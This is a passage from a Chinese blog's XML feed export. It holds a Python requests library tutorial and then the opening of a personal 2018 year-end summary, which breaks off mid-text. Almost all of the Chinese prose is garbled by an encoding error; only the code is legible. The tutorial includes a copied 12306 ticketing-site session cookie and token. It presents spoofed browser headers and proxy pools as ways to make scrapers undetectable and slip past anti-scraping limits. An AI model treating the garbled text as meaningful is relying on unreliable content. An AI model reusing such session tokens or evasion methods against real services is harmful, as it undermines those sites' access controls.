    <content type="text"><![CDATA[Pythonæ˜¯ä¸€é—¨å¼ºå¤§ä¸”çµæ´»çš„è„šæœ¬è¯­è¨€ï¼Œä¾èµ–ä¼—å¤šå¼ºå¤§çš„ç¬¬ä¸‰æ–¹åº“å¯ä»¥å¤§å¤§æé«˜å·¥ä½œæ•ˆçŽ‡ã€‚åœ¨ç½‘ç»œç¼–ç¨‹å’Œè‡ªåŠ¨åŒ–é¢†åŸŸPythonæœ‰ç€å¤§é‡çš„å®žé™…åº”ç”¨ï¼Œå¯ä»¥ç”¨Cè¯­è¨€ç¼–å†™Pythonåº•å±‚çš„å®žçŽ°åº“ï¼Œç„¶åŽé€šè¿‡Pythonç®€æ´çš„è¯­æ³•ï¼Œåœ¨å®žé™…å·¥ä½œä¸­å¿«é€Ÿè¾¾åˆ°ä¸ºæ‰€æ¬²ä¸ºçš„ç›®çš„ã€‚ç”±äºŽæœ€è¿‘å·¥ä½œéœ€è¦é…åˆæµ‹è¯•äººå‘˜è¿›è¡Œä¸€äº›æ•°æ®æŽ¥å£çš„å¤§é‡è®¿é—®å’Œæ•°æ®çš„æ‰¹é‡ç”Ÿæˆï¼Œä¸ºäº†èƒ½å¤Ÿé«˜æ•ˆçš„å®Œæˆå·¥ä½œæˆ‘é€‰æ‹©äº†Pythonã€‚å·¥ä½œä¸­ä¸€äº›é›¶æ•£çš„ä»»åŠ¡æˆ‘ä¹ŸåŸºæœ¬ä¸Šæ˜¯ä»¥Pythonæ¥å®Œæˆï¼Œæˆ‘å†³å®šåˆ†ä¸ºå‡ ç¯‡æ–‡ç« æ¥å¯¹ä¸€äº›åŸºæœ¬åº“çš„ä½¿ç”¨è¿›è¡Œè®°å½•ï¼Œæ–¹ä¾¿æ—¥åŽæŸ¥é˜…ä»¥åŠå­¦ä¹ ã€‚æœ¬ç« èŠ‚æˆ‘å…ˆä»¥æ¯”è¾ƒå¸¸ç”¨çš„requeståº“å¼€å§‹ã€‚ å¿«é€Ÿä¸Šæ‰‹å‘é€è¯·æ±‚ç¬¬ä¸€æ­¥ï¼šå¯¼å…¥requestsæ¨¡å—1&gt;&gt;&gt; import requests ç¬¬äºŒæ­¥ï¼šè¯·æ±‚ç½‘ç»œèµ„æº1&gt;&gt;&gt; r = requests.get('https://www.lanshiqin.com') ä½¿ç”¨æ–¹å¼éžå¸¸ç®€å•ï¼Œåªéœ€è¦å¼•å…¥requestsçš„æ¨¡å—ï¼Œç„¶åŽå‘é€GETè¯·æ±‚åªéœ€è¦ä¸€è¡Œä»£ç æžå®šã€‚ä¸Šè¿°æ­¥éª¤å°†ä¼šä½¿ç”¨GETè¯·æ±‚ç½‘ç«™å¹¶ä¸”å°†å“åº”çš„Responseå¯¹è±¡èµ‹å€¼ç»™rã€‚ Requestsè¿˜æ”¯æŒå„ç§RESTFulæ–¹å¼çš„è¯·æ±‚12345&gt;&gt;&gt; r = requests.post('http://httpbin.org/post', data=&#123;'key': 'value'&#125;)&gt;&gt;&gt; r = requests.put('http://httpbin.org/put', data=&#123;'key': 'value'&#125;)&gt;&gt;&gt; r = requests.delete('http://httpbin.org/delete')&gt;&gt;&gt; r = requests.head('http://httpbin.org/get')&gt;&gt;&gt; r = requests.options('http://httpbin.org/get') å“åº”å†…å®¹1234import requestsr = requests.get('https://api.github.com/')print(r.text)# è¾“å‡ºæ–‡æœ¬å†…å®¹ &#123;"current_user_url":"https://api.github.com/user","current_user_authorizations_html_url":"https://github.com/settings/connections/applications&#123;/client_id&#125;","authorizations_url":"https://api.github.com/authorizations","code_search_url":"https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","commit_search_url":"https://api.github.com/search/commits?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","emails_url":"https://api.github.com/user/emails","emojis_url":"https://api.github.com/emojis","events_url":"https://api.github.com/events","feeds_url":"https://api.github.com/feeds","followers_url":"https://api.github.com/user/followers","following_url":"https://api.github.com/user/following&#123;/target&#125;","gists_url":"https://api.github.com/gists&#123;/gist_id&#125;","hub_url":"https://api.github.com/hub","issue_search_url":"https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","issues_url":"https://api.github.com/issues","keys_url":"https://api.github.com/user/keys","notifications_url":"https://api.github.com/notifications","organization_repositories_url":"https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;","organization_url":"https://api.github.com/orgs/&#123;org&#125;","public_gists_url":"https://api.github.com/gists/public","rate_limit_url":"https://api.github.com/rate_limit","repository_url":"https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;","repository_search_url":"https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;","current_user_repositories_url":"https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;","starred_url":"https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;","starred_gists_url":"https://api.github.com/gists/starred","team_url":"https://api.github.com/teams","user_url":"https://api.github.com/users/&#123;user&#125;","user_organizations_url":"https://api.github.com/user/orgs","user_repositories_url":"https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;","user_search_url":"https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;"&#125; r.textè¾“å‡ºæ–‡æœ¬å†…å®¹çš„ç¼–ç æ˜¯Requestè¿›è¡Œè‡ªåŠ¨æŽ¨æ–­çš„ï¼Œå¯ä»¥ä½¿ç”¨r.encodingæ¥è¾“å‡ºå®žé™…å“åº”çš„ç¼–ç ï¼Œä¹Ÿå¯ä»¥è‡ªå·±è‡ªå®šResponseçš„ç¼–ç 1r.encoding = 'utf-8' äºŒè¿›åˆ¶å“åº”å†…å®¹å¯¹äºŽéžæ–‡æœ¬è¯·æ±‚ï¼Œå¯ä»¥ç”¨å­—èŠ‚byteçš„æ–¹å¼æ¥è®¿é—®å“åº”å†…å®¹Requeståº“æä¾›äº†r.contentæ¥è®¿é—®äºŒè¿›åˆ¶å“åº”å†…å®¹123456789import requestsfrom PIL import Imagefrom io import BytesIO# è¯·æ±‚å›¾ç‰‡r = requests.get('https://github.githubassets.com/images/icons/emoji/unicode/1f947.png?v8')# æ‰“å¼€å›¾ç‰‡i = Image.open(BytesIO(r.content))# ä¿å­˜å›¾ç‰‡i.save('1f947.png', 'png') åŽŸå§‹å“åº”å†…å®¹å¯¹äºŽä¸€äº›æ–‡ä»¶çš„ä¸‹è½½ï¼Œå¯ä»¥ä½¿ç”¨Requeståº“æä¾›çš„r.rawèŽ·å–åŽŸå§‹å“åº”å†…å®¹å¯ä»¥ä½¿ç”¨r.raw.read(1024)æŒ‡å®šå¤§å°çš„è¯»å–åŽŸå§‹å†…å®¹å¤§å¤šæ•°æƒ…å†µä¸‹ä¸€èˆ¬ä¼šå°†åŽŸå§‹å†…å®¹ä¿å­˜ä¸ºæ–‡ä»¶1234567import requests# è¯·æ±‚æ•°æ®r = requests.get('https://dl.pstmn.io/download/latest/osx', stream=True)print(r.raw.read(10))with open('osx.zip', 'wb') as fd: for chunk in r.iter_content(1024): fd.write(chunk) requestsè¯·æ±‚æ—¶è¦æŒ‡å®šå±žæ€§å€¼stream=True,é€šè¿‡Requestsåº“æä¾›çš„iter_contentæ–¹æ³•å¯ä»¥æŒ‡å®šä¸€æ¬¡è¯»å–å¤šå°‘æ•°æ® æ›´åŠ å¤æ‚çš„è¯·æ±‚è¯·æ±‚å¤´å‚æ•°ä»¥æˆ‘ä¸ªäººçš„ä½¿ç”¨åœºæ™¯ä½œä¸ºå‚è€ƒï¼Œä½¿ç”¨è¯·æ±‚å¤´å‚æ•°æœ€å¤šæ˜¯çˆ¬è™«ç¨‹åºï¼Œå› ä¸ºè¦ä¼ªè£…æˆæ­£å¸¸çš„ç”¨æˆ·è¯·æ±‚ï¼Œæ‰€ä»¥ä¸å¾—ä¸åœ¨è¯·æ±‚å¤´å‚æ•°ä¸­æŒ‡å®šUAå’ŒCookieç­‰å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¯¹äºŽæ­£å¸¸çš„ç¨‹åºè®¿é—®æ¥è¯´æˆ‘ä»¬ä¸€èˆ¬ä¹Ÿéœ€è¦ä¸€äº›è®¤è¯æŽˆæƒä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰è¯·æ±‚å¤´å‚æ•°æ¥è¿›è¡ŒéªŒè¯ã€‚12345678910111213141516import requestsurl = 'https://kyfw.12306.cn/otn/leftTicket/queryZ?leftTicketDTO.train_date=2019-01-07&amp;leftTicketDTO.from_station=XMS&amp;leftTicketDTO.to_station=YXS&amp;purpose_codes=ADULT'headers = &#123; 'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8', 'cache-control': 'no-cache', 'cookie': 'JSESSIONID=165AEDA56401B93F15E336494663D93E; tk=eZwgZIZASH0T-_CHKxmQrHzn0XZAtbknB1gk02D_ONMmk1110; RAIL_EXPIRATION=1546917370307; RAIL_DEVICEID=d0WOu4qSJ_ujU4sVmDaD6LfXgFfxHTWIBX__FHRtRH7o4E_3UvHcp86Iv2qCOFoEiDAh-ihWW2e6s7RnINhR1Ff8oR3In-wiOPokEhTyh1X-zci59jSrdIxTarXFrtWu03bxxzpuO0k8dfaKhCC3njv8PjH9mPtp; BIGipServerpassport=887619850.50215.0000; route=c5c62a339e7744272a54643b3be5bf64; BIGipServerotn=284164618.38945.0000; BIGipServerpool_passport=300745226.50215.0000; _jc_save_fromStation=%u53A6%u95E8%2CXMS; _jc_save_toStation=%u5C24%u6EAA%2CYXS; _jc_save_toDate=2019-01-06; _jc_save_wfdc_flag=dc; current_captcha_type=Z; _jc_save_fromDate=2019-01-07', 'if-modified-since': '0', 'referer': 'https://kyfw.12306.cn/otn/leftTicket/init?linktypeid=dc&amp;fs=%E5%8E%A6%E9%97%A8,XMS&amp;ts=%E5%B0%A4%E6%BA%AA,YXS&amp;date=2019-01-06&amp;flag=N,N,Y', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'&#125;r = requests.get(url=url, headers=headers)print(r.text) ä¸Šé¢çš„è¯·æ±‚å¤´å‚æ•°ï¼Œæ˜¯æˆ‘ç”¨Chromeæµè§ˆå™¨è®¿é—®12306è´­ç¥¨ç½‘ç«™ï¼Œç„¶åŽåœ¨å¼€å‘è€…æ¨¡å¼ä¸‹æŸ¥çœ‹ç½‘ç»œè¯·æ±‚å¾—åˆ°çš„æ•°æ®ï¼Œé€šè¿‡è¯·æ±‚å¤´å‚æ•°å°±å¯ä»¥å®Œç¾Žçš„æ¨¡æ‹Ÿæµè§ˆå™¨çš„è¯·æ±‚ï¼ŒæœåŠ¡ç«¯å°†æ— æ³•åŒºåˆ†å‡ºåˆ°åº•æ˜¯æ¥è‡ªç”¨æˆ·æ­£å¸¸çš„æµè§ˆå™¨ï¼Œè¿˜æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„è„šæ­¥ç¨‹åºã€‚é€šè¿‡è¿™äº›ç‰¹æ€§æˆ‘ä»¬å¯ä»¥åšä¸€äº›å°å·¥å…·æ–¹ä¾¿è‡ªå·±ã€‚ POSTè¯·æ±‚å‚æ•°åœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™è®¾ç½®dataå‚æ•°å€¼æ¥æŒ‡å®šè¯·æ±‚å‚æ•°ï¼Œdataé»˜è®¤æ˜¯ä¸€ä¸ªè¡¨å•æ•°æ®æ ¼å¼ï¼Œé”®å€¼å¯¹è¡¨ç¤ºè¦ä¼ é€çš„å‚æ•°åå’Œå¯¹åº”çš„å‚æ•°å€¼ã€‚12345678910import requests# è¯·æ±‚æ•°æ®data = &#123; 'CMD': '102', 'CITYNAME': 'åŽ¦é—¨å¸‚', 'KEYWORD': '641'&#125;r = requests.post('https://wx.shenghuoquan.cn/WxBusServer/ApiData.do', data=data)print(r.text) å¦‚æžœè¦ä¼ é€çš„æ ¼å¼ä¸ºjsonæ ¼å¼ï¼Œåªéœ€è¦åœ¨ä¸Šè¿°çš„dataå‚æ•°ä¸­æŒ‡å®šdata=json.dumps(data)å³å¯ï¼Œä½¿ç”¨jsonéœ€è¦åœ¨å¤´éƒ¨å¼•å…¥import json,ä¸è¿‡æœ€æ–°ç‰ˆçš„Requeståº“ä¸ºæˆ‘ä»¬åšäº†è‡ªåŠ¨è½¬æ¢ï¼Œå¦‚æžœæŽ¥å£æŽ¥å—ä¸€ä¸ªjsonè€Œä¸æ˜¯è¡¨å•ï¼Œrequeståº“ä¼šè‡ªåŠ¨å°†dataè½¬æ¢ä¸ºjsonã€‚ä¸Šé¢çš„è¯·æ±‚å‚æ•°å’Œè¯·æ±‚åœ°å€ï¼Œæ˜¯æˆ‘é€šè¿‡æŠ“åŒ…å·¥å…·å¾—åˆ°çš„ï¼ŒæŸå…¬äº¤å®žæ—¶æŸ¥è¯¢è½¯ä»¶æ‰€è¯·æ±‚çš„æ•°æ®ï¼Œé€šè¿‡postè¯·æ±‚å¹¶ä¸”å¸¦ä¸Šä¸åŒçš„å‚æ•°å€¼ï¼Œå¯ä»¥è¾¾åˆ°å’Œè½¯ä»¶è¯·æ±‚ä¸€æ ·çš„æ•ˆæžœã€‚ç”±äºŽè¯¥è½¯ä»¶æ‰“å¼€æœ‰å¹¿å‘Šå¹¶ä¸”æˆ‘è®¤ä¸ºä¸€äº›åŠŸèƒ½æ˜¯æˆ‘ç”¨ä¸åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æžç„¶åŽé€šè¿‡Pythonæ¨¡æ‹Ÿè¯·æ±‚ï¼Œæœ€ç»ˆç¡®å®šæƒ³è¦çš„æ•°æ®æŽ¥å£åŽï¼Œè‡ªå·±å¼€å‘ä¸€ä¸ªåŸºäºŽè¯¥æŽ¥å£çš„Appã€‚ POSTä¸Šä¼ Multipartç±»åž‹çš„æ–‡ä»¶é€šè¿‡Postè¯·æ±‚ä¸Šä¼ æ–‡ä»¶æ˜¯å¾ˆå¸¸è§çš„åœºæ™¯ï¼Œåœ¨Postmanç­‰å·¥å…·ä¸­å¯ä»¥æ–¹ä¾¿çš„é€‰æ‹©æ–‡ä»¶å¹¶ä¸”ä¸Šä¼ åˆ°æŒ‡å®šåœ°å€ï¼Œä½¿ç”¨Pythonçš„Requestä¸€æ ·å¾ˆæ–¹ä¾¿123456import requestsurl = 'http://httpbin.org/post'files = &#123;'file': open('1f947.png', 'rb')&#125;r = requests.post(url, files=files)print(r.text) åŒæ ·çš„ï¼Œåœ¨è¯·æ±‚çš„æ—¶å€™æŒ‡å®šfileså‚æ•°å€¼ä¸ºä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ï¼Œfiles = {&#39;file&#39;: open(&#39;1f947.png&#39;, &#39;rb&#39;)}è¿™è¡Œä»£ç å¯ä»¥æ‰“å¼€1f947.pngè¿™ä¸ªæ–‡ä»¶ä½œä¸º fileçš„å€¼ã€‚Pythonçš„è¯­æ³•ä¼˜é›…åˆ°å¦‚æ­¤ç®€å•ã€‚ é«˜çº§ç”¨æ³•ä»£ç†ç›®å‰ä¸­å›½å¤§é™†æœ‰é•¿åŸŽé˜²ç«å¢™ï¼ŒæŠŠGoogleç­‰ä¸€äº›å›½å¤–ç½‘ç«™ç»™è¿‡æ»¤äº†ï¼Œæ­£å¸¸çš„ç›´æŽ¥ç½‘ç»œæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ä¼šç§Ÿç”¨å¤§é™†ä»¥å¤–çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†åŽ»æ›¿æˆ‘ä»¬è®¿é—®ç›®æ ‡ç½‘ç«™ï¼Œæœ¬åœ°-&gt;ä»£ç†-&gt;Googleç­‰è¢«å¢™çš„ç½‘ç«™ã€‚Requestsåº“æä¾›äº†ä»£ç†åŠŸèƒ½ï¼Œå¯ä»¥åœ¨Pythonä¸­ä½¿ç”¨ä»£ç†åŽ»è®¿é—®ç½‘ç»œèµ„æºï¼Œä½¿ç”¨æ–¹å¼éžå¸¸ç®€å•123456789import requestsproxies = &#123; "http": "http://127.0.0.1:1087", "https": "https://127.0.0.1:1087"&#125;r = requests.get("https://www.google.com/", proxies=proxies)print(r.text) åœ¨è¯·æ±‚çš„æ—¶å€™è¦æŒ‡å®šproxieså±žæ€§å€¼ä¸ºæˆ‘ä»¬çš„ä»£ç†é…ç½®ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯è‡ªå·±æ­å»ºçš„VPNæœåŠ¡å™¨ï¼Œæœ¬åœ°æ˜¯Shadowsokeså®¢æˆ·ç«¯ï¼Œè¿™é‡Œçš„é…ç½®éœ€è¦æ ¹æ®å®žé™…æƒ…å†µåšä¿®æ”¹ã€‚ä»£ç†çš„ä½¿ç”¨åœºæ™¯å¾ˆå¤šï¼Œä¸ä»…ä»…æ˜¯è®¿é—®è¢«å¢™çš„ç½‘ç«™ï¼Œé€šè¿‡ä¸€æ¡å®Œç¾Žçš„ä»£ç†çº¿è·¯ä»¥åŠç¨‹åºçš„é…åˆï¼Œå¯ä»¥ç»•è¿‡å„ç§é™åˆ¶åšå„ç§ä¸ºæ‰€æ¬²ä¸ºçš„äº‹æƒ…ã€‚ä½¿ç”¨ä»£ç†æ¯”è¾ƒå¸¸è§çš„æ˜¯çˆ¬è™«ï¼Œé€šè¿‡ä»£ç†æ± åŽ»è®¿é—®ç›®æ ‡ç½‘ç«™é™ä½Žè¢«åçˆ¬è™«ç¨‹åºçš„å‘çŽ°ã€‚ æ›´å¤šç”¨æ³•æ›´å¤šé«˜çº§ç”¨æ³•è¯·è®¿é—®Requestsçš„å®˜æ–¹æ–‡æ¡£:http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advancedå¿«é€Ÿå…¥é—¨æ–‡æ¡£:http://docs.python-requests.org/zh_CN/latest/user/quickstart.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æˆ‘çš„2018å¹´ä¸ªäººæ€»ç»“]]></title>
    <url>%2Fc271defc%2F</url>
    <content type="text"><![CDATA[2018å¹´å¯¹æˆ‘æ¥è¯´æ˜¯å¾ˆæœ‰çºªå¿µæ„ä¹‰çš„ä¸€å¹´ã€‚è¿™ä¸€å¹´ï¼Œæˆ‘æ¯•ä¸šäº†ï¼Œæ­£å¼å‘Šåˆ«äº†æˆ‘çš„å­¦ç”Ÿç”Ÿæ¶¯ã€‚ä»Šå¤©æ˜¯2018å¹´12æœˆ30å·ï¼Œè·ç¦»å…ƒæ—¦è¿˜æœ‰ä¸€å¤©ã€‚åº”å”å…¬çš„é‚€çº¦ï¼Œæˆ‘å†æ¬¡æ¥åˆ°è¿™åº§è¯ºå¤§çš„åˆ«å¢…ã€‚ä¾é åœ¨åºŠä¸Šï¼Œå›žå¿†ç€2018å¹´çš„ç§ç§å¾€äº‹ã€‚ 1. å…³äºŽå¿ƒç†çŠ¶æ€å¹´åˆçš„æ—¶å€™ï¼Œä¸€è¾¹åœ¨åšæ¯•ä¸šè®¾è®¡ï¼Œä¸€è¾¹ä¸ºé¢è¯•åšå‡†å¤‡ã€‚ æ¯•è®¾æˆ‘çš„æ¯•ä¸šè®ºæ–‡è¯¾é¢˜æ˜¯ã€ŠåŸºäºŽSpring Cloud çš„åˆ†å¸ƒå¼ç½‘å…³ç³»ç»Ÿçš„ç ”ç©¶ä¸Žåº”ç”¨ã€‹ï¼Œç”±äºŽå¾ˆéš¾è½å®žåˆ°å…·ä½“çš„è½¯ä»¶é¡¹ç›®ï¼Œæ‰€ä»¥ä½¿å¾—åŽŸæœ¬åº”è¯¥å¾ˆç®€å•çš„è½¯ä»¶å·¥ç¨‹ç±»æ¯•è®¾å˜å¾—éžå¸¸éº»çƒ¦ï¼Œä¸ºäº†å†™è®ºæ–‡åå¤çº ç»“è¿™å¥—å·¥ç¨‹è¯¥æ€Žä¹ˆè®¾è®¡ï¼Œæœ€ç»ˆæŠŠé¡¹ç›®åšæˆäº†ä¸€ä¸ªAPIæŽ¥å£æ¡†æž¶ï¼ŒæŠŠSpring Cloudçš„ç»„ä»¶éƒ½ç”¨ä¸€éå¹¶ç»„åˆèµ·æ¥åšæˆå¤šä¸ªé›†ç¾¤è½åœ°åº”ç”¨ï¼Œæ‰©å±•å®žçŽ°ä¸€ä¸ªç»Ÿä¸€è§„åˆ™çš„APIç½‘å…³ï¼Œå®žçŽ°è¯·æ±‚çš„é˜²æ­¢é‡æ”¾æ”»å‡»ï¼Œè¯·æ±‚ä¸€æ¬¡æœ‰æ•ˆç­‰åŠŸèƒ½ï¼Œç»“åˆRedisè¿›è¡Œå®‰å…¨éªŒè¯ã€‚è®ºæ–‡ç­”è¾©çš„æ—¶å€™ä¸»é¢˜æ˜¯ï¼šå®‰å…¨æ€§ã€ç¨³å®šæ€§ã€å¯é…ç½®ã€‚è®ºæ–‡ç­”è¾©çš„å¾ˆä»Žå®¹ï¼Œå› ä¸ºè‡ªå·±è§‰å¾—é¡¹ç›®åšå¾—è¿˜å¯ä»¥ï¼Œä½†æ˜¯æœ€ç»ˆæ²¡èƒ½æ‹¿åˆ°ä¼˜è¾©ï¼Œå› ä¸ºè®ºæ–‡æŸ¥é‡çŽ‡è¶…è¿‡äº†20%ã€‚æˆ‘æŠŠå¤§é‡çš„æ—¶é—´éƒ½èŠ±åœ¨äº†ç ”ç©¶Spring Cloudä¸Šï¼Œè®ºæ–‡æ— ä»Žä¸‹ç¬”ç”Ÿæ¬ç¡¬å¥—äº†åˆ«äººçš„æ¨¡æ¿ã€‚è¯„å§”è€å¸ˆä¹Ÿæ„Ÿåˆ°å¾ˆä¸ºéš¾ï¼Œç‰¹æ„è¯´æœ¬æ¥å¯ä»¥æ‹¿åˆ°ä¼˜è¾©çš„ï¼Œä½†æ˜¯è®ºæ–‡é‡å¤çŽ‡å¤ªå¤šäº†ï¼ŒæŒ‰ç…§è§„å®šä¸èƒ½ä¼˜è¾©ã€‚å…¶å®žè¿™ä¹Ÿæ˜¯æˆ‘è‡ªå·±å¯¹è®ºæ–‡ä¸ç”¨å¿ƒå¯¼è‡´çš„ï¼Œå¾—çŸ¥æœ¬æ¥å¯ä»¥æ‹¿åˆ°ä¼˜è¾©å´æ²¡æ‹¿åˆ°çš„å¿ƒæƒ…æ— ä»¥è¨€è¡¨ï¼Œæˆ‘çš„è®ºæ–‡å¯¹ä¸èµ·æˆ‘çš„é¡¹ç›®ï¼Œå¸Œæœ›åœ¨ä»ŠåŽçš„ç”Ÿæ´»å’Œå·¥ä½œä¸­ä¸è¦å†æœ‰ç±»ä¼¼çš„æƒ…å†µã€‚æƒ³è¦æ‹¿åˆ°å¥½æˆç»©ï¼Œå°±è¦æå‰è®¡åˆ’å‡†å¤‡å¹¶ä¸”èŠ±è´¹è¶³å¤Ÿå¤šçš„ç²¾åŠ›åŽ»è®¤çœŸçš„å®Œæˆã€‚ é¢è¯•åœ¨æ‰¾å·¥ä½œæ–¹é¢ï¼Œæˆ‘å±žäºŽåŠè·¯å‡ºå®¶ï¼ŒåŽçŸ¥åŽè§‰æŠ±ä½›è„šåž‹ã€‚åœ¨å­¦æ ¡å·¥ä½œå®¤çš„æ—¶å€™è¯·äº†å…ä¿®é‚£äº›å·²ç»è¿‡æ—¶çš„ç¼–ç¨‹è¯¾ï¼Œç„¶åŽæŠ˜è…¾è¿‡å„ç§ç¼–ç¨‹è¯­è¨€å’Œå„ç§æ¡†æž¶ï¼šCã€C#ã€SQL server å¾®è½¯ç³»å„ç§.NET Javaã€PHPã€Pythonã€Kotlinã€Golangã€Vueã€HTMLâ€¦è¿˜æœ‰æ ‘èŽ“æ´¾ã€Unity3Dç­‰ã€‚å­¦è¿™ä¹ˆå¤šä¸æ˜¯å› ä¸ºæµ®èºï¼Œæ˜¯å› ä¸ºå¯¹ç¼–ç¨‹çš„å‘å¾€å’Œå…´è¶£ã€‚æ•´ä¸ªå¤§å­¦æ—¶å…‰è¿‡å¾—éžå¸¸å……å®žã€‚ä½†æ˜¯è¯è¯´å›žæ¥ï¼ŒçœŸæ­£ä»Žä¸€è€Œç»ˆçš„æ˜¯Javaã€‚è™½ç„¶ä»Žå¤§ä¸€å¼€å§‹å­¦Cè¯­è¨€åŽï¼Œæˆ‘ç¬¬ä¸€ä¸ªè‡ªå­¦çš„è¯­è¨€æ˜¯C#,ç„¶åŽåšäº†ä¸€ä¸ªç±»ä¼¼äºŽé‡‘å±±æ‰“å­—é€šçš„æ¸¸æˆï¼Œä½†æ˜¯åŽé¢å› ä¸ºå¯¹Androidå¾ˆæ„Ÿå…´è¶£ï¼Œæ‰€ä»¥è½¬å‘Javaï¼Œå¤§å­¦ä¸‰å¹´å†™çš„æœ€å¤šçš„æ˜¯Androidçš„åº”ç”¨ï¼Œä¹Ÿçœ‹è¿‡ä¸€äº›Androidåº•å±‚çš„ä¸œè¥¿ï¼ŒæŽ¥è¿‡Appå¤–åŒ…ã€‚ åŠè·¯å‡ºå®¶åŠè·¯å‡ºå®¶æ˜¯æˆ‘ä»Ž ç§»åŠ¨ç«¯çš„Androidå¹³å°è½¬åˆ°äº†åŽç«¯å¼€å‘ã€‚ç›´åˆ°ä¸´è¿‘æ¯•ä¸šçš„å‰ä¸€å¹´åŠï¼Œæ‰å¼€å§‹è½¬å‘åŽç«¯å¼€å‘ï¼Œæœ€ç»ˆçš„å…´è¶£ç‚¹è½åœ¨äº†åŽç«¯ä¸Šï¼Œæœ‰å¹¸å¾—åˆ°å­¦æ ¡å·¥ä½œå®¤æ–¹è€å¸ˆçš„ä¿¡ä»»ï¼Œå¤–æ´¾æˆ‘åˆ°åŽ¦é—¨å¸‚å…¬å®‰å±€åšå†…éƒ¨ç³»ç»Ÿï¼Œä»Žä¸­å‘çŽ°äº†è‡ªå·±çš„å¾ˆå¤šä¸è¶³ä»¥åŠåŽç«¯çŸ¥è¯†çš„æ¬ ç¼ºï¼Œå›žæ¥åŽè‡ªå·±é»˜é»˜çš„è¡¥ä¸Šã€‚æ•´ä¸ªå¤§å­¦ç”Ÿæ¶¯ï¼Œæˆ‘çš„çŸ¥è¯†æŠ€æœ¯éƒ½æ˜¯å›´ç»•å’ŒJavaç›¸å…³çš„æŠ€æœ¯æ ˆã€‚ä½†æ˜¯åŽç«¯çš„Javaæˆ‘è¿˜æ˜¯å±žäºŽæ¯”è¾ƒèŒæ–°çš„ï¼Œå‡ºäº†å¸¸ç”¨çš„æ¡†æž¶å’Œå·¥å…·ï¼Œæˆ‘çš„SQLçœŸçš„å¾ˆè–„å¼±ï¼Œä»¥åŠé«˜å¹¶å‘åœºæ™¯ä¸‹é”çš„æœºåˆ¶ï¼ŒJDKä¸­çš„å¹¶å‘åŒ…ä¸‹çš„é‚£äº›æºç ï¼Œæˆ‘éƒ½æ²¡æ¥å¾—åŠè®¤çœŸç ”ç©¶ã€‚ åŽçŸ¥åŽè§‰åŽçŸ¥åŽè§‰æ˜¯å› ä¸ºæ—©å°±å·²ç»è¿‡äº†å±žäºŽæˆ‘çš„æœ€ä½³æ ¡æ‹›æ—¶é—´ï¼Œé˜¿é‡Œçš„æ ¡æ‹›åœ¨ä¸€å¹´å‰å°±å·²ç»æ‹›18å±Šåº”å±Šç”Ÿäº†ã€‚æ‰€ä»¥å³ä½¿å†…æŽ¨äº†æˆ‘ä¹Ÿè¿Ÿè¿ŸæŽ’ä¸ä¸Šè¢«é¢è¯•çš„é˜Ÿä¼ï¼Œå¾ˆéš¾ä»Žé‚£ä¸ªå¤§æ± å­é‡ŒæŒ‘ä¸­æˆ‘çš„ç®€åŽ†ã€‚çœŸæ­£å†™åŽç«¯çš„æ—¶é—´å…¶å®žä¹Ÿå°±ä¸€å¹´å¤šï¼Œå°±è¿™æ ·æˆ‘åŒ†åŒ†å¿™å¿™çš„å‡†å¤‡æ‰¾JavaåŽç«¯çš„å·¥ä½œäº†ï¼Œæˆ‘è®©åœ¨é˜¿é‡Œå·¥ä½œçš„è¡¨å§å’Œå§å¤«å¸®æˆ‘å†…æŽ¨äº†ï¼Œè™½ç„¶æ²¡æœ‰æŠ¥å¾ˆå¤§çš„å¸Œæœ›ï¼Œä½†æ˜¯è¿˜æ˜¯å¾ˆè‡ªè§‰çš„æ¯å¤©å…­ç‚¹èµ·åºŠè¡¥ç¼ºè¡¥æ¼ï¼ŒæŒç»­äº†å°†è¿‘ä¸¤ä¸ªæœˆä¸€ç‚¹è¿›åº¦éƒ½æ²¡æœ‰ã€‚ ä¸´æ—¶æŠ±ä½›è„šæˆ‘é€šè¿‡æ‹›è˜å¹³å°æŠ•äº†å¾ˆå¤šé˜¿é‡Œç³»çš„å²—ä½ï¼Œç›´åˆ°è¢«èœé¸Ÿçš„ç¤¾æ‹›å²—ç”µé¢ï¼Œé¢è¯•å†…å®¹ç®€å•ç²—æš´ï¼šæ•°æ®åº“ä¹Ÿæœ‰å†…å­˜å¼•æ“Žï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç”¨Redisï¼ŸRedisèƒ½å®žçŽ°çš„é‚£äº›åœºæ™¯æ•°æ®åº“éƒ½å¯ä»¥å®žçŽ°ï¼Œä¸ºä»€ä¹ˆä¸èµ°æ•°æ®åº“ï¼Ÿ 